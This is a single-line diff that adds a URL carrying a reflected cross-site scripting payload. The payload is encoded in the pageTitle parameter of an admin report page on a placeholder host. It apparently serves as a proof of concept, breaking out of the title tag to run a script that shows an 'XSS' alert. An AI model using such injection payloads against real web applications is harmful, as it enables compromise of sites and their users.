@@ -1,0 +1,1 @@
+http://www.example.com/admin/showReport.shtml?content=serverreport.cgi&amp;pageTitle=%3C%2Ftitle%3E%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3B%3C%2Fscript%3E%3Ctitle%3E
